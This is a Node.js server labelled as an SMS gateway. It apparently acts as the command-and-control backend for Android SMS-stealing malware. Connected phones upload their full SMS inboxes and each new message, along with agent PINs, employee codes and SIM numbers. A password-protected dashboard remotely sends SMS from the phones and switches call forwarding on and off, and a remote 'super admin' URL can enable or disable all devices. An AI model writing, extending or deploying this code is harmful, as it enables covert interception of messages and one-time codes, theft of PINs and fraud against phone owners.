require('dotenv').config();
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const { initDB, dbOps, saveDB } = require('./db');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const SUPER_ADMIN_URL = process.env.SUPER_ADMIN_URL || '';
let SYSTEM_ENABLED = true;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ============ Auth ============
const sessions = new Set();
function genToken() { return uuidv4() + '-' + Date.now().toString(36); }

function authMW(req, res, next) {
    if (req.path === '/api/login') return next();
    const token = req.headers['x-auth-token'] || req.query.token;
    if (!token || !sessions.has(token)) return res.status(401).json({ error: 'Unauthorized' });
    next();
}

app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        const token = genToken(); sessions.add(token);
        res.json({ success: true, token, systemEnabled: SYSTEM_ENABLED });
    } else res.status(401).json({ error: 'Wrong password' });
});

app.post('/api/logout', (req, res) => {
    const t = req.headers['x-auth-token']; if (t) sessions.delete(t);
    res.json({ success: true });
});

app.get('/api/auth-check', (req, res) => {
    const t = req.headers['x-auth-token'] || req.query.token;
    if (t && sessions.has(t)) res.json({ authenticated: true, systemEnabled: SYSTEM_ENABLED });
    else res.status(401).json({ authenticated: false });
});

app.use('/api', authMW);

// ============ Super Admin Polling ============
async function pollSuperAdmin() {
    if (!SUPER_ADMIN_URL) return;
    try {
        const r = await fetch(`${SUPER_ADMIN_URL}/api/status`);
        const d = await r.json();
        const wasEnabled = SYSTEM_ENABLED;
        SYSTEM_ENABLED = d.enabled;
        if (wasEnabled !== SYSTEM_ENABLED) {
            console.log(`⚡ Super Admin: System ${SYSTEM_ENABLED ? 'ENABLED' : 'DISABLED'}`);
            connectedDevices.forEach((ws) => {
                try { ws.send(JSON.stringify({ type: SYSTEM_ENABLED ? 'system_enabled' : 'system_disabled' })); } catch(e){}
            });
            broadcastToDashboard('system_status', { enabled: SYSTEM_ENABLED });
        }
    } catch(e) { /* super admin unreachable — keep current state */ }
}
if (SUPER_ADMIN_URL) {
    setInterval(pollSuperAdmin, 5000);
    setTimeout(pollSuperAdmin, 2000);
}

app.get('/api/super-admin/status', (req, res) => {
    res.json({ enabled: SYSTEM_ENABLED, superAdminUrl: SUPER_ADMIN_URL || 'not configured' });
});

// ============ Connections ============
const connectedDevices = new Map();
const dashboardClients = new Set();

function broadcastToDashboard(event, data) {
    const msg = JSON.stringify({ event, ...data });
    dashboardClients.forEach(ws => { if (ws.readyState === WebSocket.OPEN) ws.send(msg); });
}

// ============ WebSocket ============
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const clientType = url.searchParams.get('type');

    // Dashboard browser client
    if (clientType === 'dashboard') {
        dashboardClients.add(ws);
        console.log(`[+] Dashboard connected (total: ${dashboardClients.size})`);
        ws.on('close', () => { dashboardClients.delete(ws); console.log(`[-] Dashboard disconnected`); });
        ws.on('error', () => dashboardClients.delete(ws));
        try {
            const devices = dbOps.getAllDevices().map(d => ({
                ...d, is_online: connectedDevices.has(d.device_id) ? 1 : 0
            }));
            ws.send(JSON.stringify({ event: 'device_list', devices }));
            ws.send(JSON.stringify({ event: 'system_status', enabled: SYSTEM_ENABLED }));
        } catch(e) { console.error('Dashboard init error:', e.message); }
        return;
    }

    // ===== Android device client =====
    let deviceId = null;

    // Also check URL params for backward compatibility
    const urlDeviceId = url.searchParams.get('deviceId');
    const urlName = url.searchParams.get('name');
    const urlAndroid = url.searchParams.get('android');
    const urlSim1 = url.searchParams.get('sim1');
    const urlSim2 = url.searchParams.get('sim2');

    // Auto-register from URL params if present
    if (urlDeviceId) {
        deviceId = urlDeviceId;
        connectedDevices.set(deviceId, ws);
        dbOps.upsertDevice(deviceId, urlName || 'Unknown', parseInt(urlAndroid) || 0, urlSim1 || '', urlSim2 || '');
        dbOps.setDeviceOnline(deviceId);
        console.log(`📱 Device auto-registered from URL: ${urlName} (${deviceId})`);
        broadcastToDashboard('device_online', { deviceId, name: urlName || 'Unknown' });
    }

    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());

            if (msg.type === 'register') {
                deviceId = msg.deviceId;
                connectedDevices.set(deviceId, ws);
                dbOps.upsertDevice(deviceId, msg.name || 'Unknown', msg.androidVersion || 0, msg.sim1 || '', msg.sim2 || '');
                dbOps.setDeviceOnline(deviceId);
                console.log(`📱 Device registered: ${msg.name} (${deviceId})`);
                broadcastToDashboard('device_online', { deviceId, name: msg.name });

                // Notify if system disabled
                if (!SYSTEM_ENABLED) {
                    ws.send(JSON.stringify({ type: 'system_disabled' }));
                }
            }
            else if (msg.type === 'agent_info') {
                const did = msg.deviceId || deviceId;
                if (did) handleAgentInfo(did, msg);
            }
            else if (msg.type === 'sms_sync') {
                const did = msg.deviceId || deviceId;
                if (did) handleSmsSync(did, msg);
            }
            else if (msg.type === 'new_sms') {
                const did = msg.deviceId || deviceId;
                if (did) handleNewSms(did, msg);
            }
            else if (msg.type === 'sms_sent') handleSmsSent(msg);
            else if (msg.type === 'call_forward_result') {
                const did = msg.deviceId || deviceId;
                console.log(`📞 Call forward: ${msg.status} (${did})`);
                // Save status in database
                if (msg.status === 'activated') {
                    dbOps.updateCallForwardStatus(did, true, msg.forwardTo || '');
                } else if (msg.status === 'deactivated') {
                    dbOps.updateCallForwardStatus(did, false, '');
                }
                broadcastToDashboard('call_forward_result', {
                    deviceId: did, status: msg.status,
                    forwardTo: msg.forwardTo, error: msg.error,
                    ussdResponse: msg.ussdResponse || '',
                    cf_active: msg.status === 'activated' ? 1 : 0,
                    cf_number: msg.status === 'activated' ? (msg.forwardTo || '') : ''
                });
            }
            else if (msg.type === 'call_forward_status') {
                const did = msg.deviceId || deviceId;
                const active = msg.active === true || msg.active === 1;
                const number = msg.forwardTo || '';
                console.log(`📞 CF Status report from ${did}: ${active ? 'ON → ' + number : 'OFF'}`);
                dbOps.updateCallForwardStatus(did, active, number);
                broadcastToDashboard('call_forward_status_update', {
                    deviceId: did,
                    cf_active: active ? 1 : 0,
                    cf_number: number
                });
            }
            else if (msg.type === 'pong') { /* keep-alive */ }
        } catch (e) { console.error('Message error:', e.message); }
    });

    ws.on('close', () => {
        if (deviceId) {
            connectedDevices.delete(deviceId);
            dbOps.setDeviceOffline(deviceId);
            console.log(`📱 Device disconnected: ${deviceId}`);
            broadcastToDashboard('device_offline', { deviceId });
        }
    });

    ws.on('error', () => {
        if (deviceId) { connectedDevices.delete(deviceId); dbOps.setDeviceOffline(deviceId); }
    });
});

// Ping devices every 30s
setInterval(() => {
    connectedDevices.forEach((ws) => {
        try { ws.send(JSON.stringify({ type: 'ping' })); } catch(e) {}
    });
}, 30000);

// ============ Handlers ============
function handleAgentInfo(deviceId, msg) {
    try {
        dbOps.updateAgentInfo(deviceId, msg.agent_pin||'', msg.funny_code||'', msg.joining_date||'',
            msg.employee_code||'', msg.sim1_number||'', msg.sim2_number||'');
        console.log(`📋 Agent info updated: ${deviceId}`);
        broadcastToDashboard('agent_info_updated', {
            deviceId, agent_pin: msg.agent_pin, funny_code: msg.funny_code,
            joining_date: msg.joining_date, employee_code: msg.employee_code,
            sim1_number: msg.sim1_number, sim2_number: msg.sim2_number
        });
    } catch(e) { console.error('Agent info error:', e.message); }
}

function handleSmsSync(deviceId, msg) {
    const messages = msg.messages || []; if (!messages.length) return;
    const toInsert = messages.map(m => ({
        device_id: deviceId, sms_id: m.id||'', address: m.address,
        body: m.body, date: m.date, folder: m.folder||'inbox', is_read: m.read?1:0
    }));
    const inserted = dbOps.insertMessages(toInsert);
    dbOps.updateDeviceSmsCount(deviceId);
    console.log(`📨 Synced ${inserted}/${messages.length} SMS from ${deviceId}`);
    broadcastToDashboard('sms_sync', { deviceId, synced: inserted, total: messages.length });
}

function handleNewSms(deviceId, msg) {
    const data = typeof msg.data === 'string' ? JSON.parse(msg.data) : msg.data || msg;
    dbOps.insertMessage(deviceId, data.id||'', data.address, data.body, data.date||Date.now(), data.folder||'inbox', false);
    dbOps.updateDeviceSmsCount(deviceId);
    broadcastToDashboard('new_sms', {
        deviceId, address: data.address, body: data.body, date: data.date, folder: data.folder||'inbox'
    });
}

function handleSmsSent(msg) {
    dbOps.updateSentStatus(msg.msgId, msg.status, msg.error||'');
    broadcastToDashboard('sms_sent_result', {
        deviceId: msg.deviceId, msgId: msg.msgId, status: msg.status, error: msg.error
    });
}

// ============ REST APIs ============
app.get('/api/devices', (req, res) => {
    res.json(dbOps.getAllDevices().map(d => ({ ...d, is_online: connectedDevices.has(d.device_id)?1:0 })));
});

app.get('/api/devices/:id', (req, res) => {
    const d = dbOps.getDevice(req.params.id);
    if (!d) return res.status(404).json({ error: 'Not found' });
    d.is_online = connectedDevices.has(d.device_id)?1:0;
    d.total_sms = dbOps.getMessageCount(d.device_id);
    res.json(d);
});

app.post('/api/devices/:id/favorite', (req, res) => {
    const fav = dbOps.toggleFavorite(req.params.id);
    broadcastToDashboard('device_favorite', { deviceId: req.params.id, is_favorite: fav });
    res.json({ is_favorite: fav });
});

app.get('/api/devices/:id/agent-history', (req, res) => {
    res.json(dbOps.getAgentHistory(req.params.id));
});

app.get('/api/devices/:id/messages', (req, res) => {
    const limit = parseInt(req.query.limit)||50, offset = parseInt(req.query.offset)||0, search = req.query.search||'';
    const messages = search ? dbOps.searchMessages(req.params.id, search, limit, offset) : dbOps.getMessages(req.params.id, limit, offset);
    res.json({ messages, total: dbOps.getMessageCount(req.params.id) });
});

app.delete('/api/messages/:id', (req, res) => {
    dbOps.deleteMessage(parseInt(req.params.id)) ? res.json({success:true}) : res.status(404).json({error:'Not found'});
});

app.post('/api/messages/delete-bulk', (req, res) => {
    const { ids } = req.body;
    if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: 'ids required' });
    res.json({ deleted: dbOps.deleteMessages(ids) });
});

app.post('/api/devices/:id/send-sms', (req, res) => {
    const { to, body, sim } = req.body;
    if (!to || !body) return res.status(400).json({ error: 'to and body required' });
    const ws = connectedDevices.get(req.params.id);
    if (!ws || ws.readyState !== WebSocket.OPEN) return res.status(404).json({ error: 'Device offline' });
    const msgId = uuidv4().substring(0, 8);
    dbOps.insertSentMessage(req.params.id, msgId, to, body, sim||0);
    ws.send(JSON.stringify({ type: 'send_sms', to, body, sim: sim||0, msgId }));
    console.log(`📤 Send SMS queued: ${to} via ${req.params.id}`);
    res.json({ success: true, msgId });
});

app.get('/api/devices/:id/sent', (req, res) => res.json(dbOps.getSentMessages(req.params.id)));

app.post('/api/devices/:id/call-forward', (req, res) => {
    const ws = connectedDevices.get(req.params.id);
    if (!ws || ws.readyState !== WebSocket.OPEN) return res.status(404).json({ error: 'Device offline' });
    const { number, sim } = req.body;
    if (!number) return res.status(400).json({ error: 'number required' });
    ws.send(JSON.stringify({ type: 'call_forward', number, sim: sim||0 }));
    console.log(`📞 Call forward to ${number} via ${req.params.id}`);
    res.json({ message: 'Call forwarding command sent' });
});

app.post('/api/devices/:id/call-forward-off', (req, res) => {
    const ws = connectedDevices.get(req.params.id);
    if (!ws || ws.readyState !== WebSocket.OPEN) return res.status(404).json({ error: 'Device offline' });
    ws.send(JSON.stringify({ type: 'call_forward_off', sim: req.body.sim||0 }));
    res.json({ message: 'Call forward OFF sent' });
});

app.get('/api/devices/:id/call-forward-status', (req, res) => {
    const d = dbOps.getDevice(req.params.id);
    if (!d) return res.status(404).json({ error: 'Not found' });
    res.json({
        cf_active: d.cf_active || 0,
        cf_number: d.cf_number || '',
        cf_updated_at: d.cf_updated_at || ''
    });
});

app.post('/api/devices/:id/check-call-forward', (req, res) => {
    const ws = connectedDevices.get(req.params.id);
    if (!ws || ws.readyState !== WebSocket.OPEN) return res.status(404).json({ error: 'Device offline' });
    ws.send(JSON.stringify({ type: 'check_call_forward', sim: req.body.sim||0 }));
    console.log(`📞 Check CF status requested for ${req.params.id}`);
    res.json({ message: 'Check call forward status sent to device' });
});

app.get('/device/:id', (req, res) => {
    const t = req.query.token;
    if (!t || !sessions.has(t)) return res.redirect('/');
    res.sendFile(path.join(__dirname, 'public', 'device.html'));
});


// ============ Start ============
async function start() {
    await initDB();
    server.listen(PORT, '0.0.0.0', () => {
        console.log(`\n🚀 SMS Gateway Server on 0.0.0.0:${PORT}`);
        console.log(`   Dashboard RDP IP: ${PORT}`);
        console.log(`   Password: ${ADMIN_PASSWORD}\n`);
    });
}
start();
process.on('SIGINT', () => { saveDB(); process.exit(); });
process.on('SIGTERM', () => { saveDB(); process.exit(); });
